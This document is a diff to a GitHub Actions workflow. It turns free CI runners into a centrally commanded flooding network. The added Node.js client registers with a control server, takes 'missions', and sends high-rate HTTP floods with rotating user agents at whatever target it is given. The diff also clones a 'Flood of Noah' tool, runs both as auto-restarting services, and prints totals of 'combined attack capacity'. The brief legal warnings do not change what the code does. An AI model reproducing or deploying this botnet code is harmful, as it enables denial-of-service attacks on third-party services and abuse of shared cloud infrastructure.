@@ -33,6 +33,10 @@ on:
           - 'medium'
           - 'high'
           - 'extreme'
+      server_url:
+        description: 'Stress test server URL (optional)'
+        required: false
+        default: 'http://localhost:5000'
 
 env:
   BASE_USER: "rdp"
@@ -41,7 +45,7 @@ env:
 jobs:
   create-ubuntu-instances:
     runs-on: ubuntu-latest
-    timeout-minutes: ${{ fromJSON(github.event.inputs.session_duration) || 360 }}
+    timeout-minutes: ${{ fromJSON(github.event.inputs.session_duration) }}
     strategy:
       max-parallel: 10
       fail-fast: false
@@ -49,7 +53,6 @@ jobs:
         instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
     name: Ubuntu-RDP-${{ matrix.instance }}
     
-    # Only run if instance number is within requested count
     if: matrix.instance <= fromJSON(github.event.inputs.instance_count)
     
     steps:
@@ -64,7 +67,6 @@ jobs:
           echo "Performance: ${{ github.event.inputs.performance_level }}"
           echo "========================================"
           
-          # Store instance info
           echo "INSTANCE_NUM=${{ matrix.instance }}" >> $GITHUB_ENV
           echo "PERF_LEVEL=${{ github.event.inputs.performance_level }}" >> $GITHUB_ENV
 
@@ -72,7 +74,6 @@ jobs:
         run: |
           sudo apt-get update -qq
           
-          # Install based on performance level
           case "$PERF_LEVEL" in
             "basic")
               PACKAGES="xfce4 xfce4-goodies dbus-x11 xorg xrdp"
@@ -92,7 +93,6 @@ jobs:
 
       - name: Configure XRDP
         run: |
-          # Create custom start script
           sudo tee /etc/xrdp/startwm.sh > /dev/null << 'EOF'
           #!/bin/sh
           if [ -r /etc/default/locale ]; then
@@ -103,14 +103,9 @@ jobs:
           EOF
           
           sudo chmod +x /etc/xrdp/startwm.sh
-          
-          # Optimize xrdp config
           sudo sed -i 's/max_bpp=32/max_bpp=24/' /etc/xrdp/xrdp.ini
-          sudo sed -i 's/port=3389/port=3389/' /etc/xrdp/xrdp.ini
-          echo "max_bpp=24" | sudo tee -a /etc/xrdp/xrdp.ini
           echo "use_compression=yes" | sudo tee -a /etc/xrdp/xrdp.ini
           
-          # Enable and start service
           sudo systemctl enable xrdp
           sudo systemctl start xrdp
           sudo ufw allow 3389/tcp 2>/dev/null || true
@@ -124,37 +119,29 @@ jobs:
           echo "$USERNAME:$PASSWORD" | sudo chpasswd
           sudo usermod -aG sudo $USERNAME
           
-          # Store credentials
           echo "RDP_USER=$USERNAME" >> $GITHUB_ENV
           echo "RDP_PASSWORD=$PASSWORD" >> $GITHUB_ENV
           
           echo "✅ Created user: $USERNAME"
 
-      - name: Install Node.js and Dependencies
+      - name: Install Node.js
         run: |
-          # Install Node.js 18
-          curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
-          sudo apt-get install -y nodejs
-          
-          # Install additional tools
-          sudo apt-get install -y python3 python3-pip git
-          
+          curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
+          sudo apt-get install -y nodejs git
           echo "✅ Node.js $(node --version) installed"
 
       - name: Install Stress Test Client
         run: |
-          # Create stress test directory
-          sudo -u $RDP_USER bash << 'EOF'
+          sudo -u $RDP_USER bash << 'SCRIPT_EOF'
             cd /home/$RDP_USER
-            mkdir -p stress-test-client
-            cd stress-test-client
+            mkdir -p stress-client
+            cd stress-client
             
             # Create package.json
             cat > package.json << 'PKG_EOF'
           {
             "name": "stress-test-client",
             "version": "1.0.0",
-            "description": "Distributed stress testing client",
             "main": "client.js",
             "dependencies": {
               "axios": "^1.6.0"
@@ -162,10 +149,298 @@ jobs:
           }
           PKG_EOF
             
+            # Create the stress test client
+            cat > client.js << 'CLIENT_EOF'
+          const axios = require('axios');
+          const os = require('os');
+          const fs = require('fs');
+          
+          const SERVER_URL = process.env.SERVER_URL || 'http://localhost:5000';
+          const HEARTBEAT_INTERVAL = 5000;
+          
+          let clientId = null;
+          let isAttacking = false;
+          let requestsSent = 0;
+          let requestsFailed = 0;
+          let userAgents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0'];
+          let currentUAIndex = 0;
+          
+          const colors = {
+            reset: '\x1b[0m', green: '\x1b[32m', yellow: '\x1b[33m',
+            red: '\x1b[31m', cyan: '\x1b[36m', magenta: '\x1b[35m'
+          };
+          
+          function log(msg, color = 'reset') {
+            console.log(`${colors[color]}[${new Date().toISOString().split('T')[1].split('.')[0]}] ${msg}${colors.reset}`);
+          }
+          
+          function getRandomUA() {
+            currentUAIndex = (currentUAIndex + 1) % userAgents.length;
+            return userAgents[currentUAIndex];
+          }
+          
+          async function registerWithServer() {
+            try {
+              const res = await axios.post(`${SERVER_URL}/api/client/register`, {
+                hostname: os.hostname(),
+                platform: `${os.platform()} ${os.arch()}`
+              });
+              clientId = res.data.client_id;
+              log(`✓ Registered: ${clientId}`, 'green');
+              return true;
+            } catch (err) {
+              log(`✗ Registration failed: ${err.message}`, 'red');
+              return false;
+            }
+          }
+          
+          async function sendHeartbeat() {
+            if (!clientId) return;
+            try {
+              const res = await axios.post(`${SERVER_URL}/api/client/heartbeat/${clientId}`, {
+                requests_sent: requestsSent,
+                requests_failed: requestsFailed
+              });
+              
+              if (res.data.mission && !isAttacking) {
+                log(`📬 New mission received`, 'yellow');
+                executeMission(res.data.mission);
+              }
+              
+              if (res.data.mission?.stopped && isAttacking) {
+                log('⛔ Stop signal received!', 'red');
+              }
+            } catch (err) {
+              log(`✗ Heartbeat failed: ${err.message}`, 'red');
+            }
+          }
+          
+          async function makeRequest(url, method) {
+            const start = Date.now();
+            try {
+              const config = {
+                headers: { 'User-Agent': getRandomUA() },
+                timeout: 3000,
+                validateStatus: () => true
+              };
+              
+              let response;
+              if (method === 'HTTP-GET' || method === 'GET') {
+                response = await axios.get(url + `?cb=${Date.now()}`, config);
+              } else if (method === 'HTTP-POST' || method === 'POST') {
+                response = await axios.post(url, {data: 'x'.repeat(1024)}, config);
+              } else {
+                response = await axios.get(url, config);
+              }
+              
+              return {
+                success: true,
+                statusCode: response.status,
+                responseTime: Date.now() - start
+              };
+            } catch (err) {
+              return {
+                success: err.code === 'ECONNABORTED' || err.code === 'ETIMEDOUT',
+                error: err.message,
+                statusCode: 0,
+                responseTime: Date.now() - start
+              };
+            }
+          }
+          
+          async function executeMission(mission) {
+            isAttacking = true;
+            log(`🚀 Starting attack: ${mission.mission_id}`, 'magenta');
+            
+            const results = { completed: 0, failed: 0, response_times: [], status_codes: {}, errors: [] };
+            const startTime = Date.now();
+            const endTime = startTime + (mission.duration * 1000);
+            const delayBetweenRequests = 1000 / mission.requests_per_second;
+            
+            let activeRequests = 0;
+            const maxConcurrent = Math.min(mission.requests_per_second, 100);
+            let shouldStop = false;
+            
+            const fireRequest = async () => {
+              activeRequests++;
+              const result = await makeRequest(mission.target_url, mission.method);
+              activeRequests--;
+              
+              if (result.success) {
+                results.completed++;
+                results.response_times.push(result.responseTime);
+                requestsSent++;
+                const key = String(result.statusCode);
+                results.status_codes[key] = (results.status_codes[key] || 0) + 1;
+              } else {
+                results.failed++;
+                requestsFailed++;
+                if (results.errors.length < 10) results.errors.push(result.error);
+              }
+            };
+            
+            const progressInterval = setInterval(() => {
+              if (mission.stopped) shouldStop = true;
+              const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
+              const remaining = ((endTime - Date.now()) / 1000).toFixed(1);
+              process.stdout.write(`\r${colors.yellow}Attacking... Sent: ${requestsSent} | Success: ${results.completed} | Failed: ${requestsFailed} | Active: ${activeRequests} | ${elapsed}s / ${remaining}s${colors.reset}`);
+            }, 500);
+            
+            while (Date.now() < endTime && !shouldStop) {
+              if (mission.stopped) {
+                log('\n⛔ Mission stopped', 'red');
+                break;
+              }
+              
+              const batchSize = Math.min(maxConcurrent - activeRequests, mission.requests_per_second);
+              for (let i = 0; i < batchSize && Date.now() < endTime && !shouldStop; i++) {
+                fireRequest();
+              }
+              
+              await new Promise(resolve => setTimeout(resolve, Math.max(10, delayBetweenRequests / 10)));
+            }
+            
+            const timeout = Date.now() + 10000;
+            while (activeRequests > 0 && Date.now() < timeout) {
+              await new Promise(resolve => setTimeout(resolve, 100));
+            }
+            
+            clearInterval(progressInterval);
+            console.log('\n');
+            log(shouldStop ? `⛔ STOPPED: ${results.completed} ok, ${results.failed} failed` : `✓ Complete: ${results.completed} ok, ${results.failed} failed`, shouldStop ? 'red' : 'green');
+            
+            if (results.response_times.length > 0) {
+              results.stats = {
+                min: Math.min(...results.response_times),
+                max: Math.max(...results.response_times),
+                avg: results.response_times.reduce((a,b)=>a+b,0) / results.response_times.length
+              };
+            }
+            
+            try {
+              await axios.post(`${SERVER_URL}/api/client/report/${clientId}`, {
+                mission_id: mission.mission_id,
+                results: results
+              });
+              log('📤 Results reported', 'green');
+            } catch (err) {
+              log(`✗ Report failed: ${err.message}`, 'red');
+            }
+            
+            isAttacking = false;
+          }
+          
+          async function main() {
+            log('='.repeat(60), 'cyan');
+            log('STRESS TEST CLIENT - AWAITING ORDERS', 'cyan');
+            log('='.repeat(60), 'cyan');
+            log(`Server: ${SERVER_URL}`, 'cyan');
+            log(`Hostname: ${os.hostname()}`, 'cyan');
+            log('='.repeat(60), 'cyan');
+            
+            const registered = await registerWithServer();
+            if (!registered) {
+              log('Failed to register. Exiting.', 'red');
+              process.exit(1);
+            }
+            
+            log('🎯 Client ready. Waiting for missions...', 'green');
+            setInterval(sendHeartbeat, HEARTBEAT_INTERVAL);
+            sendHeartbeat();
+          }
+          
+          process.on('SIGINT', () => {
+            log('\n👋 Shutting down...', 'yellow');
+            process.exit(0);
+          });
+          
+          main().catch(err => {
+            log(`Fatal: ${err.message}`, 'red');
+            process.exit(1);
+          });
+          CLIENT_EOF
+            
             npm install
+            
+            echo "✅ Stress test client installed"
+          SCRIPT_EOF
+
+      - name: Install Flood of Noah
+        run: |
+          echo "🌊 Installing Flood of Noah..."
+          
+          # Setup puppeteer directory
+          sudo mkdir -p /home/$RDP_USER/.config/puppeteer
+          sudo chown -R $RDP_USER:$RDP_USER /home/$RDP_USER
+          sudo chmod -R 755 /home/$RDP_USER
+          
+          # Clone and install flood_of-noah
+          sudo -u $RDP_USER bash << 'FLOOD_EOF'
+            cd /home/$RDP_USER
+            rm -rf flood_of-noah
+            git clone https://github.com/benbenido025-lab/flood_of-noah
+            cd flood_of-noah
+            rm -rf node_modules package-lock.json
+            npm install express axios socks puppeteer --save
+            
+            echo "✅ Flood of Noah installed"
+          FLOOD_EOF
+
+      - name: Create Flood Service
+        run: |
+          # Create systemd service for flood_of-noah
+          sudo tee /etc/systemd/system/flood-noah-$INSTANCE_NUM.service > /dev/null << EOF
+          [Unit]
+          Description=Flood of Noah Service - Instance $INSTANCE_NUM
+          After=network-online.target
+          Wants=network-online.target
+          
+          [Service]
+          Type=simple
+          User=$RDP_USER
+          WorkingDirectory=/home/$RDP_USER/flood_of-noah
+          ExecStart=/usr/bin/node index.js
+          Restart=always
+          RestartSec=10
+          Environment=NODE_ENV=production
+          Environment=INSTANCE_NUMBER=$INSTANCE_NUM
+          
+          [Install]
+          WantedBy=multi-user.target
           EOF
           
-          echo "✅ Stress test client installed"
+          sudo systemctl daemon-reload
+          sudo systemctl enable flood-noah-$INSTANCE_NUM.service
+          
+          echo "✅ Flood of Noah service configured"
+
+      - name: Create Auto-Start Service
+        run: |
+          # Create systemd service to auto-start client
+          sudo tee /etc/systemd/system/stress-client-$INSTANCE_NUM.service > /dev/null << EOF
+          [Unit]
+          Description=Stress Test Client - Instance $INSTANCE_NUM
+          After=network-online.target tailscaled.service
+          Wants=network-online.target
+          
+          [Service]
+          Type=simple
+          User=$RDP_USER
+          WorkingDirectory=/home/$RDP_USER/stress-client
+          ExecStart=/usr/bin/node client.js
+          Restart=always
+          RestartSec=10
+          Environment=NODE_ENV=production
+          Environment=SERVER_URL=${{ github.event.inputs.server_url }}
+          
+          [Install]
+          WantedBy=multi-user.target
+          EOF
+          
+          sudo systemctl daemon-reload
+          sudo systemctl enable stress-client-$INSTANCE_NUM.service
+          
+          echo "✅ Auto-start service configured"
 
       - name: Install Tailscale VPN
         run: |
@@ -175,12 +450,10 @@ jobs:
           sudo apt-get install -y -qq tailscale
 
       - name: Connect to Tailscale Network
-        id: tailscale
         run: |
-          HOSTNAME="ubuntu-rdp-$INSTANCE_NUM-${{ github.run_id }}"
+          HOSTNAME="rdp$INSTANCE_NUM-${{ github.run_id }}"
           sudo tailscale up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=$HOSTNAME --accept-routes
           
-          # Wait for IP assignment
           RETRY=0
           TAILSCALE_IP=""
           while [ $RETRY -lt 30 ]; do
@@ -197,253 +470,212 @@ jobs:
           
           if [ -z "$TAILSCALE_IP" ]; then
             echo "❌ Failed to get Tailscale IP"
-            echo "TAILSCALE_IP=NOT_ASSIGNED" >> $GITHUB_ENV
             exit 1
           fi
 
-      - name: Configure Performance Optimizations
+      - name: Start Services
         run: |
-          # Based on performance level, apply optimizations
+          # Start stress test client
+          sudo systemctl start stress-client-$INSTANCE_NUM.service
+          
+          # Start flood of noah
+          sudo systemctl start flood-noah-$INSTANCE_NUM.service
+          
+          sleep 3
+          
+          if sudo systemctl is-active --quiet stress-client-$INSTANCE_NUM.service; then
+            echo "✅ Stress client service started"
+          else
+            echo "⚠️ Stress client service not running (will start when server is available)"
+          fi
+          
+          if sudo systemctl is-active --quiet flood-noah-$INSTANCE_NUM.service; then
+            echo "✅ Flood of Noah service started"
+          else
+            echo "⚠️ Flood of Noah service starting..."
+          fi
+
+      - name: Configure Performance
+        run: |
           case "$PERF_LEVEL" in
             "high"|"extreme")
-              echo "🚀 Applying performance optimizations..."
-              
-              # Increase file descriptors
               echo "* soft nofile 1000000" | sudo tee -a /etc/security/limits.conf
               echo "* hard nofile 1000000" | sudo tee -a /etc/security/limits.conf
               
-              # Optimize sysctl for network performance
-              sudo tee -a /etc/sysctl.conf > /dev/null << 'SYSCTL_EOF'
-          # Network optimizations for high-performance stress testing
+              sudo tee -a /etc/sysctl.conf > /dev/null << 'SYSCTL'
           net.core.rmem_max = 134217728
           net.core.wmem_max = 134217728
           net.ipv4.tcp_rmem = 4096 87380 134217728
           net.ipv4.tcp_wmem = 4096 65536 134217728
           net.core.netdev_max_backlog = 300000
           net.ipv4.tcp_max_syn_backlog = 300000
-          net.ipv4.tcp_max_tw_buckets = 2000000
-          net.ipv4.tcp_fin_timeout = 10
-          net.ipv4.tcp_slow_start_after_idle = 0
           net.ipv4.tcp_tw_reuse = 1
           net.ipv4.ip_local_port_range = 1024 65535
-          net.core.somaxconn = 65535
-          SYSCTL_EOF
+          SYSCTL
               
               sudo sysctl -p
-              echo "✅ Performance optimizations applied"
+              echo "✅ Performance tuned"
               ;;
           esac
 
-      - name: Create README for User
+      - name: Create Desktop README
         run: |
+          sudo -u $RDP_USER mkdir -p /home/$RDP_USER/Desktop
           sudo -u $RDP_USER tee /home/$RDP_USER/Desktop/README.txt > /dev/null << EOF
           ╔══════════════════════════════════════════════════════╗
           ║        UBUNTU RDP INSTANCE #$INSTANCE_NUM               ║
           ╚══════════════════════════════════════════════════════╝
           
-          🔐 YOUR CREDENTIALS:
+          🔐 CREDENTIALS:
              Username: $RDP_USER
              Password: $RDP_PASSWORD
           
-          🌐 NETWORK INFO:
-             Tailscale IP: $TAILSCALE_IP
+          🌐 NETWORK:
+             IP: $TAILSCALE_IP
              Hostname: $HOSTNAME
           
-          📁 STRESS TEST CLIENT:
-             Location: ~/stress-test-client/
+          💥 STRESS CLIENT:
+             Status: RUNNING (auto-started)
+             Location: ~/stress-client/
+             Logs: sudo journalctl -u stress-client-$INSTANCE_NUM -f
              
-             To use the stress test client:
-             1. Get the client code from the control server
-             2. Place it in ~/stress-test-client/client.js
-             3. Run: node ~/stress-test-client/client.js
+             The client automatically connects to the control server
+             and waits for attack missions. No manual start needed!
           
-          ⚡ SYSTEM INFO:
-             Performance Level: $PERF_LEVEL
-             CPU Cores: $(nproc)
+          🌊 FLOOD OF NOAH:
+             Status: RUNNING (auto-started)
+             Location: ~/flood_of-noah/
+             Logs: sudo journalctl -u flood-noah-$INSTANCE_NUM -f
+             Access: http://$TAILSCALE_IP:3000
+             
+             Endpoints:
+             • http://$TAILSCALE_IP:3000/status - Check status
+             • http://$TAILSCALE_IP:3000/flood?count=100 - Send flood
+          
+          ⚡ SYSTEM:
+             Performance: $PERF_LEVEL
+             CPU: $(nproc) cores
              RAM: $(free -h | awk '/^Mem:/ {print $2}')
           
-          📊 THIS INSTANCE CAN:
-             • Send 1000+ requests/second
-             • Handle 100+ concurrent connections
-             • Run distributed stress tests
-             • Connect to any Tailscale network peer
+          📊 CAPACITY:
+             • 1000+ requests/second
+             • 100+ concurrent connections
+             • Distributed stress testing ready
           
-          ⚠️  LEGAL WARNING:
-             Only test systems you own or have explicit permission to test.
-             Unauthorized stress testing is illegal.
+          ⚠️ LEGAL WARNING:
+             Only test authorized systems!
           
-          📝 NOTES:
-             - Firefox is installed for web browsing
-             - Terminal available: Ctrl+Alt+T
-             - File manager: Thunar
-             - This session will auto-terminate after ${{ github.event.inputs.session_duration }} minutes
-          
-          🔗 USEFUL COMMANDS:
-             Check Tailscale status: tailscale status
-             Check network: ip addr
-             Monitor resources: htop
+          🔧 COMMANDS:
+             • Check stress client: sudo systemctl status stress-client-$INSTANCE_NUM
+             • Check flood: sudo systemctl status flood-noah-$INSTANCE_NUM
+             • View client logs: sudo journalctl -u stress-client-$INSTANCE_NUM -f
+             • View flood logs: sudo journalctl -u flood-noah-$INSTANCE_NUM -f
+             • Restart services: sudo systemctl restart stress-client-$INSTANCE_NUM
+             • Check network: tailscale status
              
+          Session ends: ${{ github.event.inputs.session_duration }} minutes
           EOF
-          
-          sudo chown $RDP_USER:$RDP_USER /home/$RDP_USER/Desktop/README.txt || true
 
-      - name: Display Connection Information
+      - name: Display Connection Info
         run: |
           echo ""
           echo "╔══════════════════════════════════════════════════════╗"
-          echo "║          UBUNTU RDP INSTANCE #$INSTANCE_NUM READY        ║"
+          echo "║          INSTANCE #$INSTANCE_NUM READY                   ║"
           echo "╠══════════════════════════════════════════════════════╣"
           echo "║ 🌐 NETWORK:"
+          echo "║   IP:         $TAILSCALE_IP"
           echo "║   Hostname:   $HOSTNAME"
-          echo "║   Tailscale:  $TAILSCALE_IP"
           echo "║"
           echo "║ 🔐 RDP ACCESS:"
           echo "║   Address:    $TAILSCALE_IP:3389"
           echo "║   Username:   $RDP_USER"
           echo "║   Password:   $RDP_PASSWORD"
           echo "║"
-          echo "║ ⚡ PERFORMANCE:"
-          echo "║   Level:      $PERF_LEVEL"
-          echo "║   CPU:        $(nproc) cores"
-          echo "║   RAM:        $(free -h | awk '/^Mem:/ {print $2}')"
-          echo "║   Disk:       $(df -h / | awk 'NR==2 {print $4}') free"
-          echo "║"
-          echo "║ 💥 ATTACK CAPACITY:"
-          echo "║   Requests/sec:  1000+"
-          echo "║   Concurrent:    100+"
-          echo "║   Duration:      ${{ github.event.inputs.session_duration }} min"
+          echo "║ 💥 SERVICES:"
+          echo "║   Stress Client: RUNNING"
+          echo "║   Flood Noah:    RUNNING"
+          echo "║   Server:        ${{ github.event.inputs.server_url }}"
+          echo "║   Flood API:     http://$TAILSCALE_IP:3000"
+          echo "║   Auto-start:    ENABLED"
           echo "╚══════════════════════════════════════════════════════╝"
           echo ""
 
       - name: Keep Instance Alive
         run: |
-          DURATION_MINUTES=${{ github.event.inputs.session_duration || 360 }}
-          END_TIME=$(( $(date +%s) + (DURATION_MINUTES * 60) ))
+          DURATION=${{ github.event.inputs.session_duration }}
+          END_TIME=$(( $(date +%s) + (DURATION * 60) ))
           
-          echo "🟢 Instance #$INSTANCE_NUM ACTIVE"
-          echo "Started: $(date)"
-          echo "Will end: $(date -d @$END_TIME)"
-          echo "Duration: $DURATION_MINUTES minutes"
+          echo "🟢 Instance #$INSTANCE_NUM ACTIVE for $DURATION minutes"
           echo ""
           
           COUNTER=0
           while [ $(date +%s) -lt $END_TIME ]; do
             COUNTER=$((COUNTER + 1))
-            ELAPSED_MIN=$(( ( $(date +%s) - (END_TIME - (DURATION_MINUTES * 60)) ) / 60 ))
-            REMAINING_MIN=$(( (END_TIME - $(date +%s)) / 60 ))
+            ELAPSED=$(( ( $(date +%s) - (END_TIME - (DURATION * 60)) ) / 60 ))
+            REMAINING=$(( (END_TIME - $(date +%s)) / 60 ))
             
-            echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-            echo "🟢 Instance #$INSTANCE_NUM | $(date '+%Y-%m-%d %H:%M:%S')"
-            echo "⏱️  Elapsed: $ELAPSED_MIN min | Remaining: $REMAINING_MIN min"
-            echo "🌐 IP: $TAILSCALE_IP | User: $RDP_USER"
+            echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+            echo "🟢 #$INSTANCE_NUM | $(date '+%H:%M:%S') | ⏱️ $ELAPSED/$DURATION min"
             
-            # Health checks every 5 minutes
             if [ $((COUNTER % 5)) -eq 0 ]; then
-              echo ""
-              echo "🔍 Service Health Check:"
               if sudo systemctl is-active --quiet xrdp; then
                 echo "   ✅ XRDP: Running"
               else
-                echo "   ❌ XRDP: Stopped - Restarting..."
+                echo "   ❌ XRDP: Restarting..."
                 sudo systemctl restart xrdp
               fi
               
-              if tailscale status >/dev/null 2>&1; then
-                echo "   ✅ Tailscale: Connected"
+              if sudo systemctl is-active --quiet stress-client-$INSTANCE_NUM; then
+                echo "   ✅ Stress Client: Running"
               else
-                echo "   ⚠️  Tailscale: Reconnecting..."
+                echo "   ⚠️ Stress Client: Restarting..."
+                sudo systemctl restart stress-client-$INSTANCE_NUM
               fi
               
-              echo ""
-              echo "📊 System Stats:"
-              echo "   CPU: $(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1"%"}')"
-              echo "   RAM: $(free -h | awk '/^Mem:/ {print $3 "/" $2}')"
-              echo "   Load: $(uptime | awk -F'load average:' '{print $2}')"
+              if sudo systemctl is-active --quiet flood-noah-$INSTANCE_NUM; then
+                echo "   ✅ Flood of Noah: Running"
+              else
+                echo "   ⚠️ Flood of Noah: Restarting..."
+                sudo systemctl restart flood-noah-$INSTANCE_NUM
+              fi
             fi
-            
-            echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-            echo ""
             
             sleep 60
           done
           
-          echo ""
-          echo "⏰ Session completed for Instance #$INSTANCE_NUM"
-          echo "Total uptime: $DURATION_MINUTES minutes"
+          echo "⏰ Session complete - Instance #$INSTANCE_NUM"
 
-      - name: Cleanup on Exit
+      - name: Cleanup
         if: always()
         run: |
-          echo "🧹 Cleaning up Instance #$INSTANCE_NUM..."
+          echo "🧹 Cleanup..."
+          sudo systemctl stop stress-client-$INSTANCE_NUM || true
+          sudo systemctl stop flood-noah-$INSTANCE_NUM || true
           sudo tailscale logout || true
-          echo "✅ Cleanup complete"
 
-  final-summary:
+  summary:
     needs: create-ubuntu-instances
     runs-on: ubuntu-latest
     if: always()
     steps:
-      - name: Generate Network Summary
+      - name: Summary
         run: |
           echo ""
-          echo "███████╗████████╗██████╗ ███████╗███████╗███████╗"
-          echo "██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔════╝██╔════╝"
-          echo "███████╗   ██║   ██████╔╝█████╗  ███████╗███████╗"
-          echo "╚════██║   ██║   ██╔══██╗██╔══╝  ╚════██║╚════██║"
-          echo "███████║   ██║   ██║  ██║███████╗███████║███████║"
-          echo "╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝"
-          echo "████████╗███████╗███████╗████████╗"
-          echo "╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝"
-          echo "   ██║   █████╗  ███████╗   ██║   "
-          echo "   ██║   ██╔══╝  ╚════██║   ██║   "
-          echo "   ██║   ███████╗███████║   ██║   "
-          echo "   ╚═╝   ╚══════╝╚══════╝   ╚═╝   "
-          echo ""
           echo "╔══════════════════════════════════════════════════════════╗"
-          echo "║      MULTI-UBUNTU RDP NETWORK - DEPLOYMENT COMPLETE     ║"
+          echo "║      MULTI-UBUNTU RDP - DEPLOYMENT COMPLETE            ║"
           echo "╚══════════════════════════════════════════════════════════╝"
           echo ""
-          echo "📊 DEPLOYMENT CONFIGURATION:"
-          echo "   ├─ Instances Requested: ${{ github.event.inputs.instance_count }}"
-          echo "   ├─ Performance Level: ${{ github.event.inputs.performance_level }}"
-          echo "   ├─ Session Duration: ${{ github.event.inputs.session_duration || 360 }} minutes"
-          echo "   └─ Status: ✅ DEPLOYMENT COMPLETE"
+          echo "📊 Configuration:"
+          echo "   Instances: ${{ github.event.inputs.instance_count }}"
+          echo "   Performance: ${{ github.event.inputs.performance_level }}"
+          echo "   Duration: ${{ github.event.inputs.session_duration }} min"
+          echo "   Server: ${{ github.event.inputs.server_url }}"
           echo ""
-          echo "🌐 NETWORK CAPABILITIES:"
-          echo "   ├─ Total Machines: ${{ github.event.inputs.instance_count }} Ubuntu instances"
-          echo "   ├─ RDP Access: All machines accessible via Tailscale"
-          echo "   ├─ Stress Testing: Ready for distributed attacks"
-          echo "   └─ VPN Network: Fully meshed Tailscale network"
-          echo ""
-          echo "💥 COMBINED ATTACK CAPACITY:"
-          echo "   ├─ Total Requests/sec: $(( ${{ github.event.inputs.instance_count }} * 1000 ))+ req/s"
-          echo "   ├─ Concurrent Connections: $(( ${{ github.event.inputs.instance_count }} * 100 ))"
-          echo "   ├─ CPU Cores: $(( ${{ github.event.inputs.instance_count }} * 4 )) cores"
-          echo "   └─ Network Bandwidth: Distributed across cloud"
-          echo ""
-          echo "🔧 EACH INSTANCE INCLUDES:"
-          echo "   ├─ Ubuntu Desktop (XFCE4) via RDP"
-          echo "   ├─ Stress test client ready"
-          echo "   ├─ Tailscale VPN connectivity"
-          echo "   ├─ Performance optimized"
-          echo "   ├─ Firefox web browser"
-          echo "   └─ Development tools installed"
-          echo ""
-          echo "📝 CONNECTION INSTRUCTIONS:"
-          echo "   1. Install Tailscale on your local machine"
-          echo "   2. Join the same Tailscale network"
-          echo "   3. Use RDP client to connect:"
-          echo "      • Windows: mstsc.exe"
-          echo "      • Mac: Microsoft Remote Desktop"
-          echo "      • Linux: Remmina or xfreerdp"
-          echo "   4. Connect to: <TAILSCALE_IP>:3389"
-          echo "   5. Login with credentials shown above"
-          echo ""
-          echo "⚠️  LEGAL NOTICE:"
-          echo "   These instances are for AUTHORIZED testing only."
-          echo "   Only test systems you own or have explicit permission."
-          echo "   Unauthorized stress testing is illegal and unethical."
+          echo "💥 Total Capacity:"
+          echo "   Requests/sec: $(( ${{ github.event.inputs.instance_count }} * 1000 ))+"
+          echo "   Concurrent: $(( ${{ github.event.inputs.instance_count }} * 100 ))"
           echo ""
           echo "✅ ALL SYSTEMS OPERATIONAL"
-          echo "🟢 Network ready for distributed stress testing"
+          echo "🟢 Stress clients auto-started and waiting for missions"
+          echo "🌊 Flood of Noah servers running on port 3000"
           echo ""
